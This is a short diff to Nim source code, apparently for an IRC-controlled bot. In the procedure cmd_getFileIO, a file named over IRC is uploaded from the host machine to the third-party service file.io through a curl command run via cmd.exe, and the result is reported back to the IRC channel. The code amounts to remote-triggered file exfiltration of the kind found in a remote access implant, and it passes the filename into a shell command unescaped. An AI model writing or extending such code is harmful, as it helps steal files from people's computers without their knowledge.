@@ -103,7 +103,7 @@ proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
 
     if fileExists(filename):
         try:
-            var (output, _ ) = execCmdEx("cmd.exe start /B curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+            var (output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
 
             if output.contains("success\":true"):
                 try:
@@ -119,7 +119,6 @@ proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) =
     else:
         if g_dbg: echo "File missing"
         client.privmsg(event.origin, "i dont see it")
-#      curl -F  "file=@./test.txt" "https://file.io?expires=1h"
 
 
 
